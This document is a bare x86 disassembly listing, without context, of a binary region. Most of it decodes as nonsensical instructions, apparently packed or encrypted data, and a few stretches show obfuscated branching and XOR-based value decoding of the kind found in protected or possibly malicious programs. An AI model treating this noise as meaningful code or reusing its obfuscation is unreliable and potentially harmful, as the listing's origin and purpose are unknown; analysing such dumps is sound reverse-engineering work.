  40819e:	mov    edi,0x40407e61
  4081a3:	xor    cl,al
  4081a5:	lods   al,BYTE PTR ds:[esi]
  4081a6:	cs pop edx
  4081a8:	ja     0x408137
  4081aa:	cmc    
  4081ab:	retf   
  4081ac:	push   ss
  4081ad:	xchg   ebx,eax
  4081ae:	mov    ds:0xbca418e9,eax
  4081b3:	mov    esi,0x81f7f55a
  4081b8:	les    edi,FWORD PTR [edx]
  4081ba:	call   0x51f7:0x126904f6
  4081c1:	cmp    DWORD PTR [edi+0xb],ebx
  4081c4:	enter  0x25d5,0x29
  4081c8:	dec    esp
  4081c9:	test   al,0x70
  4081cb:	into   
  4081cc:	sub    dl,dl
  4081ce:	in     al,0x38
  4081d0:	sbb    ecx,DWORD PTR [ebx-0x67628c55]
  4081d6:	sbb    al,0xe4
  4081d8:	pushf  
  4081d9:	out    dx,al
  4081da:	sbb    dl,cl
  4081dc:	push   cs
  4081dd:	(bad)  
  4081de:	test   al,0x74
  4081e0:	adc    BYTE PTR [edi+0x13],bh
  4081e3:	jmp    0x63ab:0x1b8ed0b
  4081ea:	sti    
  4081eb:	jp     0x4081f9
  4081ed:	stos   DWORD PTR es:[edi],eax
  4081ee:	fwait
  4081ef:	popa   
  4081f0:	test   al,0x53
  4081f2:	repnz out 0xe9,eax
  4081f5:	mov    BYTE PTR ds:0x6d64d290,bh
  4081fb:	stos   BYTE PTR es:[edi],al
  4081fc:	sbb    ebx,DWORD PTR [eax-0x64]
  4081ff:	jnp    0x408275
  408201:	icebp  
  408202:	and    BYTE PTR [ebx+0x6d569be1],bh
  408208:	neg    BYTE PTR [ecx]
  40820a:	sub    ecx,esi
  40820c:	test   eax,0x652ad0fd
  408211:	and    ebp,ecx
  408213:	fld    QWORD PTR [eax+ecx*2-0x2]
  408217:	lods   al,BYTE PTR ds:[esi]
  408218:	daa    
  408219:	fist   DWORD PTR [ecx-0x72]
  40821c:	jbe    0x4081d6
  40821e:	dec    edx
  40821f:	pop    es
  408220:	loop   0x4081e1
  408222:	mov    esp,DWORD PTR [esi-0xc]
  408225:	sub    DWORD PTR [eax-0x46],0x7018b4d7
  40822c:	mov    ch,0x56
  40822e:	push   ss
  40822f:	dec    esp
  408230:	jno    0x408232
  408232:	arpl   WORD PTR [ebp-0x55],ax
  408235:	add    dl,BYTE PTR [ebp+0x49dd13f0]
  40823b:	loop   0x408214
  40823d:	adc    al,0xf8
  40823f:	dec    eax
  408240:	mov    bl,0x10
  408242:	pop    ebp
  408243:	lea    esi,[edx+0x14]
  408246:	mov    ah,0x8c
  408248:	cwde   
  408249:	sbb    al,0xf6
  40824b:	pop    ebx
  40824c:	scas   eax,DWORD PTR es:[edi]
  40824d:	and    DWORD PTR [ebp+0xed9a53a],esp
  408253:	inc    esp
  408254:	xchg   edi,eax
  408255:	pop    esi
  408256:	inc    ecx
  408257:	loopne 0x408266
  408259:	lds    edi,FWORD PTR [ecx-0x43]
  40825c:	sti    
  40825d:	mov    dh,0x3a
  40825f:	add    al,BYTE PTR [si-0xc]
  408263:	xor    BYTE PTR [esi],cl
  408265:	scas   al,BYTE PTR es:[edi]
  408266:	sub    ah,BYTE PTR [esi]
  408268:	mov    cl,0xf1
  40826a:	jp     0x408268
  40826c:	in     al,dx
  40826d:	popa   
  40826e:	add    DWORD PTR [ebx],0xfffffff3
  408271:	div    DWORD PTR [ecx+0x1ea552db]
  408277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408278:	push   esp
  408279:	jmp    0x24ee:0x2163efd
  408280:	icebp  
  408281:	cs jne 0x408223
  408284:	xchg   esp,eax
  408285:	out    dx,eax
  408286:	push   ds
  408287:	push   esp
  408288:	mov    ch,ch
  40828a:	add    eax,0x4afa75d4
  40828f:	inc    ebx
  408290:	les    edi,FWORD PTR [edx+ebp*1]
  408293:	inc    ebp
  408294:	out    0x58,eax
  408296:	dec    edx
  408297:	out    dx,eax
  408298:	fild   WORD PTR [eax]
  40829a:	mov    ebx,0x6af07e9
  40829f:	push   eax
  4082a0:	push   eax
  4082a1:	inc    ecx
  4082a2:	imul   esi,DWORD PTR [ebx],0xa3d8148d
  4082a8:	pop    ebp
  4082a9:	leave  
  4082aa:	loopne 0x408320
  4082ac:	(bad)  [eax-0x30]
  4082af:	mov    WORD PTR [ebx-0x16],es
  4082b2:	push   edi
  4082b3:	add    esi,DWORD PTR [ebx+0x15]
  4082b6:	mov    al,ds:0x890ecc83
  4082bb:	jbe    0x408292
  4082bd:	inc    eax
  4082be:	repz (bad) 
  4082c0:	pushf  
  4082c1:	sti    
  4082c2:	mov    bh,0xf6
  4082c4:	jo     0x4082af
  4082c6:	jmp    FWORD PTR [edx-0x494a9411]
  4082cc:	imul   edi,DWORD PTR [ecx+0x6b],0xffffffcc
  4082d0:	mov    eax,0x13e119fc
  4082d5:	dec    edx
  4082d6:	ja     0x4082cc
  4082d8:	fdiv   st(3),st
  4082da:	loopne 0x408305
  4082dc:	cmp    eax,0xa063f3ad
  4082e1:	scas   eax,DWORD PTR es:[edi]
  4082e2:	mov    ah,0x2c
  4082e4:	rol    DWORD PTR [ecx+0x7b],1
  4082e7:	imul   edi,edx,0x938357a3
  4082ed:	mov    dl,0x99
  4082ef:	fnstcw WORD PTR [ebx+0x59]
  4082f2:	rcr    BYTE PTR [eax],0x8c
  4082f5:	rcl    dh,cl
  4082f7:	hlt    
  4082f8:	data16 fimul WORD PTR [edx-0x2bfe2e49]
  4082ff:	sub    eax,ebp
  408301:	retf   0x5fc5
  408304:	pop    edx
  408305:	neg    DWORD PTR [esi]
  408307:	mov    WORD PTR [ecx+0x70],ds
  40830a:	jmp    0x9724:0xeeeb955b
  408311:	cwde   
  408312:	jp     0x408372
  408314:	shl    edx,0x8e
  408317:	add    al,0xad
  408319:	push   ss
  40831a:	mov    eax,ds:0xff25ff26
  40831f:	outs   dx,DWORD PTR ds:[esi]
  408320:	pop    fs
  408322:	jae    0x40830c
  408324:	addr16 (bad) 
  408326:	into   
  408327:	(bad)  
  408328:	mov    al,0xcc
  40832a:	js     0x408367
  40832c:	jmp    0xe722:0x9296ccf5
  408333:	xchg   ebx,eax
  408334:	xor    al,0xef
  408336:	pusha  
  408337:	xor    al,0x19
  408339:	push   es
  40833a:	retf   0x419
  40833d:	mov    ds:0xe8c3d949,eax
  408342:	inc    esp
  408343:	test   BYTE PTR [edx+0xcceab6c],ah
  408349:	inc    esi
  40834a:	pop    ecx
  40834b:	mov    cl,ah
  40834d:	xchg   esi,eax
  40834e:	xor    eax,0x2c67cc6a
  408353:	out    0xfb,al
  408355:	ret    
  408356:	shl    DWORD PTR [edi+0x59],cl
  408359:	scas   eax,DWORD PTR es:[edi]
  40835a:	call   0x67044b43
  40835f:	repnz adc eax,0x89d72335
  408365:	jmp    0x6d704c14
  40836a:	push   0x49da1317
  40836f:	retf   0x50ab
  408372:	arpl   dx,sp
  408374:	jge    0x4083e0
  408376:	inc    ebx
  408377:	jbe    0x408380
  408379:	je     0x4083ad
  40837b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40837c:	dec    esi
  40837d:	rol    DWORD PTR [edx+0x43],cl
  408380:	jl     0x40838e
  408382:	jp     0x408327
  408384:	call   0xcac5:0x4a54342b
  40838b:	inc    esp
  40838c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40838d:	dec    esp
  40838e:	dec    edx
  40838f:	mov    dl,0x32
  408391:	test   eax,0x55a1e374
  408396:	pop    edx
  408397:	and    al,0xe8
  408399:	stos   BYTE PTR es:[edi],al
  40839a:	xor    BYTE PTR [ecx],bl
  40839c:	adc    edi,DWORD PTR [ebx]
  40839e:	mov    DWORD PTR [ecx],eax
  4083a0:	loope  0x408394
  4083a2:	pop    edx
  4083a3:	adc    edx,edx
  4083a5:	(bad)  
  4083a6:	and    eax,0xe81761cb
  4083ab:	test   al,0xcb
  4083ad:	lahf   
  4083ae:	retf   0xd95b
  4083b1:	stos   DWORD PTR es:[edi],eax
  4083b2:	ds popa 
  4083b4:	lds    ebx,FWORD PTR [esi]
  4083b6:	inc    eax
  4083b7:	mov    ds:0x603b1f17,al
  4083bc:	call   0xad1942f9
  4083c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083c2:	jns    0x408364
  4083c4:	mov    al,ds:0xec6f7733
  4083c9:	scas   eax,DWORD PTR es:[edi]
  4083ca:	mov    ecx,0xe95883d1
  4083cf:	push   edx
  4083d0:	rcr    DWORD PTR ds:0xe83de267,1
  4083d6:	ret    0x5dbd
  4083d9:	test   DWORD PTR [eax-0x5f],edx
  4083dc:	inc    ecx
  4083dd:	dec    esp
  4083de:	xchg   DWORD PTR [ecx-0x21],ecx
  4083e1:	mov    cl,BYTE PTR [ebp+0x1d]
  4083e4:	add    DWORD PTR ds:0xa982e938,0x47
  4083eb:	sub    cl,BYTE PTR [eax*4+0x5984313]
  4083f2:	cmp    bh,ah
  4083f4:	mov    al,0xf4
  4083f6:	add    al,0x1a
  4083f8:	ins    BYTE PTR es:[edi],dx
  4083f9:	xchg   BYTE PTR [ebx+0x18],bh
  4083fc:	xor    eax,DWORD PTR [esi-0x5d6c5632]
  408402:	pop    ebx
  408403:	aas    
  408404:	inc    ebx
  408405:	in     al,dx
  408406:	sbb    dh,BYTE PTR [esp+ebp*2]
  408409:	or     al,0x0
  40840b:	mov    esp,0x64d03f5a
  408410:	fbstp  TBYTE PTR [ebx-0x19bfa338]
  408416:	push   edi
  408417:	adc    DWORD PTR [edx],esp
  408419:	rcr    ch,1
  40841b:	inc    eax
  40841c:	xor    al,0xc7
  40841e:	fadd   QWORD PTR [edi+ecx*4]
  408421:	std    
  408422:	cmp    ah,BYTE PTR [edi]
  408424:	int    0x7
  408426:	xor    al,0x5
  408428:	lods   eax,DWORD PTR ds:[esi]
  408429:	jo     0x40842d
  40842b:	stos   BYTE PTR es:[edi],al
  40842c:	cwde   
  40842d:	popf   
  40842e:	fisub  DWORD PTR [edi]
  408430:	push   0x27ab7f3f
  408435:	(bad)  
  408437:	sbb    eax,0xbd442202
  40843c:	or     eax,0x6ef467fa
  408441:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  408443:	mov    ss,esp
  408445:	jmp    0x408430
  408447:	sub    eax,0x5b952b3b
  40844c:	push   es
  40844d:	call   0xd7ec4c47
  408452:	rol    BYTE PTR ds:0x4f623234,1
  408458:	xor    DWORD PTR [edi-0x43d17e51],edi
  40845e:	sub    ebx,DWORD PTR [ebp-0x27]
  408461:	sub    ch,BYTE PTR [ebx-0x10]
  408464:	xor    DWORD PTR [esi+0x33],esi
  408467:	stc    
  408468:	xchg   ebx,eax
  408469:	scas   eax,DWORD PTR es:[edi]
  40846a:	test   al,0xb
  40846c:	cmc    
  40846d:	dec    eax
  40846e:	pop    ebx
  40846f:	(bad)  
  408471:	repz into 
  408473:	stos   BYTE PTR es:[edi],al
  408474:	pop    esi
  408475:	mov    dh,0xff
  408477:	push   ebx
  408478:	clc    
  408479:	xchg   edi,eax
  40847a:	lds    esp,FWORD PTR [ecx+0x1d2d4c53]
  408480:	cmp    al,BYTE PTR [eax-0xf]
  408483:	lea    esp,[esi-0x66fea9d4]
  408489:	in     eax,0xb1
  40848b:	mov    ds:0xb5320c4b,al
  408490:	lock ffree st(3)
  408493:	je     0x4084af
  408495:	stos   DWORD PTR es:[edi],eax
  408496:	push   ss
  408497:	xchg   ebx,eax
  408498:	lahf   
  408499:	mov    WORD PTR [ebx+0x4f],?
  40849c:	repz xor edi,esi
  40849f:	cmp    dl,cl
  4084a1:	xchg   ecx,eax
  4084a2:	jge    0x408513
  4084a4:	cmp    edi,ebx
  4084a6:	mov    ecx,DWORD PTR [edi+ebp*8]
  4084a9:	mov    eax,0xf049421c
  4084ae:	sbb    cl,ah
  4084b0:	int    0x21
  4084b2:	test   ch,bh
  4084b4:	inc    esp
  4084b5:	in     al,0x67
  4084b7:	lahf   
  4084b8:	imul   esi,eax,0xffffff8b
  4084bb:	inc    ebp
  4084bc:	clc    
  4084bd:	xor    eax,ecx
  4084bf:	add    eax,esi
  4084c1:	pop    edi
  4084c2:	pop    esi
  4084c3:	pop    ebx
  4084c4:	leave  
  4084c5:	ret    0x4
  4084c8:	mov    eax,DWORD PTR [ebp-0xc]
  4084cb:	add    eax,DWORD PTR [ebp-0x18]
  4084ce:	cmp    eax,0x50b25e45
  4084d3:	je     0x4084e7
  4084d9:	mov    eax,DWORD PTR [ebp-0x10]
  4084dc:	and    DWORD PTR [eax],0x751c9d
  4084e2:	jmp    0x4084ba
  4084e7:	mov    eax,DWORD PTR [ebp-0xc]
  4084ea:	mov    edx,DWORD PTR [ebp-0x18]
  4084ed:	or     eax,edx
  4084ef:	cmp    eax,0xf89f3dbd
  4084f4:	je     0x40887e
  4084fa:	mov    eax,DWORD PTR [ebp-0x10]
  4084fd:	jmp    0x408873
  408502:	pop    esi
  408503:	sahf   
  408504:	pop    edi
  408505:	pop    es
  408506:	pop    edi
  408507:	shl    DWORD PTR [esi+0x61],0xde
  40850b:	cdq    
  40850c:	outs   dx,BYTE PTR ds:[esi]
  40850d:	pop    esi
  40850e:	mov    edi,DWORD PTR [ebp+eax*2+0x7cde32c3]
  408515:	jl     0x4084ee
  408517:	jns    0x408595
  408519:	jl     0x40849d
  40851b:	and    al,0x45
  40851d:	xchg   ecx,eax
  40851e:	and    cl,BYTE PTR [ebx+ecx*8-0x7ff7d6e8]
  408525:	ds push cs
  408527:	and    dh,ah
  408529:	ss or  BYTE PTR fs:[eax+ecx*2],al
  40852e:	push   0xc16eb746
  408533:	loop   0x4085a9
  408535:	push   es
  408536:	dec    ecx
  408537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408538:	add    DWORD PTR [ebx-0x64],edi
  40853b:	jmp    0xc3ae:0xfc30a14c
  408542:	pop    ebx
  408543:	es mov dh,0x89
  408546:	stos   BYTE PTR es:[edi],al
  408547:	push   ss
  408548:	imul   esi,DWORD PTR [esi-0x71],0xbe977b6e
  40854f:	loopne 0x408531
  408551:	and    al,0x22
  408553:	jns    0x408587
  408555:	out    dx,al
  408556:	pop    edi
  408557:	ss sbb al,0x9d
  40855a:	sar    DWORD PTR [edi],cl
  40855c:	mov    bl,0x72
  40855e:	fbstp  TBYTE PTR [ecx+0xa3b52bd]
  408564:	fwait
  408565:	js     0x40852b
  408567:	call   DWORD PTR [esi+0x35]
  40856b:	rcl    cl,0xa9
  40856e:	jle    0x408563
  408570:	pusha  
  408571:	mov    edi,0x5dd8e1bf
  408576:	lds    esi,FWORD PTR [esi+0x16b82ba2]
  40857c:	leave  
  40857d:	jbe    0x40853f
  40857f:	icebp  
  408580:	dec    edx
  408581:	mov    ch,0x48
  408583:	(bad)  
  408584:	fidivr DWORD PTR [ebx]
  408586:	ss xor al,0x9b
  408589:	int3   
  40858a:	sub    dh,BYTE PTR [ebp+0x6e0aa5fe]
  408590:	in     al,dx
  408591:	push   0xfb206e01
  408596:	outs   dx,DWORD PTR ds:[esi]
  408597:	xchg   esp,ebp
  408599:	ins    BYTE PTR es:[edi],dx
  40859a:	in     al,dx
  40859b:	ja     0x408558
  40859d:	loope  0x408564
  40859f:	push   esi
  4085a0:	push   ss
  4085a1:	push   ebx
  4085a2:	cdq    
  4085a3:	pop    edx
  4085a4:	je     0x408557
  4085a6:	pop    ds
  4085a7:	jg     0x40853f
  4085a9:	xchg   esp,eax
  4085aa:	jge    0x4085a2
  4085ac:	sub    BYTE PTR [esi-0x1a],bl
  4085af:	les    esp,FWORD PTR [eax]
  4085b1:	popf   
  4085b2:	jnp    0x40862b
  4085b4:	jl     0x4085e9
  4085b6:	loop   0x4085e0
  4085b8:	mov    ebp,0xe8fc3312
  4085bd:	jmp    0x2c4d:0x85a6996c
  4085c4:	adc    ecx,esi
  4085c6:	mov    ebx,0x4cd04517
  4085cb:	jmp    0x4085b1
  4085cd:	dec    edi
  4085ce:	dec    edi
  4085cf:	into   
  4085d0:	jecxz  0x40856d
  4085d2:	mov    ebp,0x3056ba9d
  4085d7:	push   esi
  4085d8:	loop   0x4085a9
  4085da:	popf   
  4085db:	inc    edi
  4085dc:	stc    
  4085dd:	in     eax,dx
  4085de:	xor    ch,BYTE PTR [ebp+0x2b]
  4085e1:	jb     0x408639
  4085e3:	test   eax,0xaf692e41
  4085e8:	push   ds
  4085e9:	ss jg  0x4085ca
  4085ec:	test   al,0x30
  4085ee:	add    DWORD PTR [eax],esi
  4085f0:	fincstp 
  4085f2:	cwde   
  4085f3:	push   edx
  4085f4:	sar    DWORD PTR [esi-0x7b5abdf8],cl
  4085fa:	xlat   BYTE PTR ds:[ebx]
  4085fb:	out    dx,eax
  4085fc:	jmp    0x4085b9
  4085fe:	sbb    al,0xf7
  408600:	cmp    BYTE PTR [edx+0x47],bl
  408603:	push   ecx
  408604:	cmp    DWORD PTR [ebx],edx
  408606:	sbb    ebx,DWORD PTR [edx]
  408608:	sbb    BYTE PTR [esi-0x7209d954],dh
  40860e:	mov    eax,ds:0x723ce915
  408613:	aaa    
  408614:	dec    edx
  408615:	mov    ch,0x12
  408617:	popa   
  408618:	push   ds
  408619:	shl    eax,1
  40861b:	loopne 0x408671
  40861d:	jl     0x408621
  40861f:	rol    edi,0x15
  408622:	jnp    0x408676
  408624:	out    dx,al
  408625:	int    0x13
  408627:	pop    esp
  408628:	adc    dh,0xf3
  40862b:	inc    ecx
  40862c:	ret    0x416a
  40862f:	mov    eax,0xd4a9fc3
  408634:	mov    ebx,0x2410c3c8
  408639:	mov    ah,bh
  40863b:	push   0x8971185a
  408640:	hlt    
  408641:	pop    ebp
  408642:	sbb    ah,BYTE PTR [eax+0x594f2d87]
  408648:	mov    dl,ch
  40864a:	aad    0x43
  40864c:	leave  
  40864d:	push   ecx
  40864e:	jbe    0x4085d3
  408650:	jno    0x40869f
  408652:	pop    ss
  408653:	jnp    0x4085da
  408655:	or     ecx,DWORD PTR [esi-0x6507128d]
  40865b:	stos   DWORD PTR es:[edi],eax
  40865c:	clc    
  40865d:	jbe    0x4085f4
  40865f:	scas   al,BYTE PTR es:[edi]
  408660:	xchg   edx,eax
  408661:	leave  
  408662:	pusha  
  408663:	div    edx
  408665:	in     eax,dx
  408666:	sbb    ah,BYTE PTR [ecx-0x531cbc68]
  40866c:	stc    
  40866d:	sbb    DWORD PTR [ebp-0x795c2d35],ebp
  408673:	mov    ds:0x75ca0002,al
  408678:	pop    ebp
  408679:	in     al,dx
  40867a:	cli    
  40867b:	mov    esp,0x15a3262
  408680:	add    DWORD PTR [edx+0x6a],edi
  408683:	sbb    BYTE PTR [esi],0x3e
  408686:	stos   DWORD PTR es:[edi],eax
  408687:	push   esi
  408688:	xor    eax,0xee08a69f
  40868d:	sti    
  40868e:	mov    dh,0x40
  408690:	out    0xc1,eax
  408692:	imul   ebp,DWORD PTR [esi],0x2a
  408695:	(bad)  
  408696:	xor    bl,BYTE PTR [edi-0x550cd8b8]
  40869c:	xchg   edx,eax
  40869d:	adc    dl,0xb9
  4086a0:	icebp  
  4086a1:	imul   edx,DWORD PTR [edx],0xf670a27f
  4086a7:	ss pushf 
  4086a9:	adc    eax,0xafd144cc
  4086ae:	lods   al,BYTE PTR ds:[esi]
  4086af:	xor    BYTE PTR [edx-0x5f9a92ce],bl
  4086b5:	pop    edx
  4086b6:	xor    al,BYTE PTR [edi-0x62]
  4086b9:	mov    ch,0x5b
  4086bb:	jne    0x4086e1
  4086bd:	mov    ah,dh
  4086bf:	les    eax,FWORD PTR [edx]
  4086c1:	xor    bh,cl
  4086c3:	sub    BYTE PTR [edi-0x3013e04f],bl
  4086c9:	test   eax,0xf8339275
  4086ce:	inc    edi
  4086cf:	xor    edx,DWORD PTR [eax+0x24]
  4086d2:	ret    
  4086d3:	fbld   TBYTE PTR [esi-0x4]
  4086d6:	cli    
  4086d7:	fdiv   st,st(0)
  4086d9:	(bad)  
  4086db:	shl    DWORD PTR [esi-0xe2f4ceb],0xf7
  4086e2:	pop    ds
  4086e3:	sbb    bh,BYTE PTR [edi]
  4086e5:	mov    bl,0x7b
  4086e7:	inc    edi
  4086e8:	mov    ah,0xe7
  4086ea:	jle    0x4086be
  4086ec:	gs xchg edx,eax
  4086ee:	mov    ds:0xe9bdde3,eax
  4086f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086f4:	sbb    esp,ebp
  4086f6:	adc    eax,0x43997ac8
  4086fb:	inc    edx
  4086fc:	fdivr  QWORD PTR [bx+si+0x8b8]
  408701:	mov    esi,0x25e9c8a3
  408706:	push   ss
  408707:	and    BYTE PTR [ebp-0x22],cl
  40870a:	jae    0x40874e
  40870c:	sahf   
  40870d:	into   
  40870e:	cmc    
  40870f:	enter  0xca9d,0x20
  408713:	fwait
  408714:	into   
  408715:	jp     0x408737
  408717:	retf   0xc31c
  40871a:	imul   DWORD PTR [ecx-0x4dcf9ae8]
  408720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408721:	and    ebx,edx
  408723:	dec    ebx
  408724:	fcom   DWORD PTR [ebx+ebx*1-0x6f4df9b4]
  40872b:	rcr    bh,cl
  40872d:	sar    BYTE PTR [edx+0x5a11f228],1
  408733:	dec    eax
  408734:	dec    esp
  408735:	loop   0x40872f
  408737:	mov    edi,0x6e72ba29
  40873c:	mov    esp,0xbe3e015
  408741:	sub    dl,BYTE PTR [ebx]
  408743:	(bad)  
  408744:	frstor [ecx+eax*8]
  408747:	mov    edi,0x53fa697e
  40874c:	ins    DWORD PTR es:[edi],dx
  40874d:	xchg   BYTE PTR [edx+0x63d2696],dh
  408753:	xchg   esp,eax
  408754:	pop    edi
  408755:	es mov ah,0x6b
  408758:	popa   
  408759:	pop    eax
  40875a:	je     0x40879c
  40875c:	and    ch,BYTE PTR [eax-0x2a]
  40875f:	in     al,0x1f
  408761:	shr    ch,0x7b
  408764:	int    0x59
  408766:	hlt    
  408767:	push   cs
  408768:	clc    
  408769:	jnp    0x408746
  40876b:	mov    es,WORD PTR [esi+esi*1-0x21]
  40876f:	mov    esp,0x6f4c4c1e
  408774:	cwde   
  408775:	lock sbb eax,0x4c22645c
  40877b:	jmp    0x576e1462
  408780:	clc    
  408781:	add    ah,BYTE PTR [ecx]
  408783:	(bad)  
  408784:	jo     0x4087cc
  408786:	loopne 0x40871a
  408788:	adc    DWORD PTR [eax+0x28dd177b],ebp
  40878e:	push   eax
  40878f:	in     al,dx
  408790:	inc    ebp
  408791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408792:	inc    esp
  408793:	gs pop esi
  408795:	jge    0x4087f7
  408797:	dec    esp
  408798:	(bad)  
  408799:	adc    BYTE PTR ds:0x1c797ab9,al
  40879f:	adc    DWORD PTR [eax+0x66748b91],ecx
  4087a5:	sub    al,0xef
  4087a7:	aas    
  4087a8:	ret    0xb4a7
  4087ab:	xchg   BYTE PTR [ebx],ch
  4087ad:	adc    eax,0x698f4c84
  4087b2:	mov    ch,0x51
  4087b4:	out    0x4e,al
  4087b6:	cwde   
  4087b7:	div    cl
  4087b9:	imul   esp,DWORD PTR [edi],0x45
  4087bc:	cvtdq2ps xmm1,XMMWORD PTR [edx+0x43]
  4087c0:	into   
  4087c1:	push   esi
  4087c2:	xchg   esp,eax
  4087c3:	pop    eax
  4087c4:	or     eax,0x521fc762
  4087c9:	stc    
  4087ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087cb:	push   esi
  4087cc:	dec    ecx
  4087cd:	push   esi
  4087ce:	fnstcw WORD PTR [ebp+0x7c]
  4087d1:	ds or  eax,0x6e8277dd
  4087d7:	mov    esp,0x96657063
  4087dc:	outs   dx,BYTE PTR ds:[esi]
  4087dd:	dec    sp
  4087df:	mov    al,0x45
  4087e1:	add    ch,bl
  4087e3:	das    
  4087e4:	lahf   
  4087e5:	cdq    
  4087e6:	or     ah,BYTE PTR [ecx]
  4087e8:	imul   esp,DWORD PTR [edi-0x2e],0xc61319f4
  4087ef:	shr    DWORD PTR [esi],1
  4087f1:	cwde   
  4087f2:	xor    ecx,DWORD PTR [edi-0x2f]
  4087f5:	xchg   BYTE PTR [ebp-0x18f1455],dl
  4087fb:	add    al,0x15
  4087fd:	rol    DWORD PTR [edi-0x37],0x53
  408801:	push   edx
  408802:	leave  
  408803:	xor    eax,0xd318bd8f
  408808:	sub    eax,0x4fb647d6
  40880d:	imul   esp,DWORD PTR [edi+0x37],0x9da7cefc
  408814:	daa    
  408815:	jns    0x408893
  408817:	bound  ebx,QWORD PTR [edx-0x32]
  40881a:	or     al,0xf9
  40881c:	ja     0x40888d
  40881e:	retf   0x9132
  408821:	cs inc esi
  408823:	call   0xa7be:0xe002e632
  40882a:	inc    ebx
  40882b:	rcl    ch,1
  40882d:	shr    DWORD PTR [ebx+0x60],1
  408830:	or     bh,al
  408832:	xchg   DWORD PTR [eax],edx
  408834:	lds    ecx,FWORD PTR [ecx-0x7bd393e4]
  40883a:	shld   DWORD PTR [ecx+0x10],esi,cl
  40883e:	add    al,0x46
  408840:	mov    al,0x7b
  408842:	daa    
  408843:	push   ss
  408844:	xchg   eax,edi
  408846:	fldcw  WORD PTR [ecx]
  408848:	or     eax,0x93e33c16
  40884d:	xor    al,0xee
  40884f:	in     eax,0x51
  408851:	pop    esi
  408852:	xchg   esp,eax
  408853:	stos   BYTE PTR es:[edi],al
  408854:	std    
  408855:	hlt    
  408856:	jle    0x40880d
  408858:	cli    
  408859:	pushf  
  40885a:	aam    0xb2
  40885c:	pop    esi
  40885d:	repnz inc edx
  40885f:	cwde   
  408860:	cmc    
  408861:	mov    dl,0xc2
  408863:	dec    edx
  408864:	gs out 0xdf,eax
  408867:	sbb    al,0x4e
  408869:	jnp    0x4088c8
  40886b:	pop    ecx
  40886c:	push   0xa5666f4a
  408871:	mov    bl,0x9f
  408873:	xor    DWORD PTR [eax],0x2650fa8f
  408879:	jmp    0x4084ba
  40887e:	mov    ax,WORD PTR [ebp-0x4]
  408882:	mov    edi,DWORD PTR [ebp+0x8]
  408885:	mov    edi,DWORD PTR [edi]
  408887:	mov    edx,0x8a3a
  40888c:	xor    ax,dx
  40888f:	mov    edx,0x3b00
  408894:	add    ax,dx
  408897:	cmp    ax,WORD PTR [edi]
  40889a:	je     0x409349
  4088a0:	mov    eax,DWORD PTR [ebp-0x14]
  4088a3:	xor    eax,ecx
  4088a5:	add    eax,esi
  4088a7:	mov    DWORD PTR [ebp-0x24],eax
  4088aa:	mov    eax,DWORD PTR [ebp-0x28]
  4088ad:	mov    di,WORD PTR [ebp-0x2c]
  4088b1:	mov    ebx,0x8a3a
  4088b6:	xor    di,bx
  4088b9:	add    di,dx
  4088bc:	movzx  edx,di
  4088bf:	mov    edi,DWORD PTR [ebp-0x8]
  4088c2:	xor    edi,ecx
  4088c4:	lea    edx,[edx+edi*1+0x32729a]
  4088cb:	add    DWORD PTR [eax],edx
  4088cd:	jmp    0x408c43
  4088d2:	add    al,0x63
  4088d4:	loop   0x4088d0
  4088d6:	ins    DWORD PTR es:[edi],dx
  4088d7:	test   DWORD PTR [ebp+ebp*2+0xe],esp
  4088db:	loop   0x408905
  4088dd:	add    al,0xc2
  4088df:	push   edi
  4088e0:	fisubr DWORD PTR [edi+0x7c7cdb95]
  4088e6:	xlat   BYTE PTR ds:[ebx]
  4088e7:	jns    0x408965
  4088e9:	jl     0x408930
  4088eb:	cmp    ebp,ebp
  4088ed:	out    0x39,eax
  4088ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088f0:	jb     0x408897
  4088f2:	ret    0x41a2
  4088f5:	jbe    0x4088c0
  4088f7:	and    BYTE PTR [esi+0x1f429bf],dl
  4088fd:	pop    ecx
  4088fe:	push   0x63a2a45e
  408903:	push   esi
  408904:	mov    dh,0xb7
  408906:	test   BYTE PTR [edx-0x67],ah
  408909:	lea    esi,[edx]
  40890b:	adc    DWORD PTR [ecx+esi*1+0x2503e292],0x7c
  408913:	sahf   
  408914:	and    BYTE PTR [ebx-0x47529a90],bh
  40891a:	cmp    edi,DWORD PTR [edi]
  40891c:	xchg   ecx,eax
  40891d:	cdq    
  40891e:	cmp    edi,eax
  408920:	push   ebx
  408921:	sbb    ebp,DWORD PTR [ecx]
  408923:	fsubr  QWORD PTR es:[ebx+ebx*4-0x46c282c7]
  40892b:	in     al,dx
  40892c:	mov    es,WORD PTR [ecx+0x32]
  40892f:	adc    al,0xf5
  408931:	jg     0x4089a1
  408933:	dec    eax
  408934:	mov    eax,ds:0x59487c00
  408939:	(bad)  [ecx]
  40893b:	add    al,0xb7
  40893d:	mov    eax,0xd20f8795
  408942:	adc    al,0xa2
  408944:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408946:	inc    eax
  408947:	stos   BYTE PTR es:[edi],al
  408948:	add    al,0x30
  40894a:	pop    ss
  40894b:	xor    ch,BYTE PTR gs:[eax+eiz*8+0x57]
  408950:	jns    0x408983
  408952:	in     eax,0xe0
  408954:	cdq    
  408955:	and    eax,0xa82d21fc
  40895a:	adc    ebx,DWORD PTR [ebp-0x67ebf2ea]
  408960:	or     BYTE PTR [esi+0x3309051a],ah
  408966:	ins    DWORD PTR es:[edi],dx
  408967:	mov    BYTE PTR [edx],dh
  408969:	fadd   DWORD PTR [eax+0x504484f8]
  40896f:	and    DWORD PTR [eax-0x3c],edi
  408972:	and    DWORD PTR [edi-0x7a85c4f],0xffffff8d
  408979:	sbb    BYTE PTR [ebx-0x5f],bh
  40897c:	bswap  ebp
  40897e:	sbb    bl,bl
  408980:	mov    BYTE PTR [edi],bl
  408982:	mov    ch,0x3f
  408984:	addr16 xchg si,ax
  408987:	cli    
  408988:	leave  
  408989:	scas   al,BYTE PTR es:[edi]
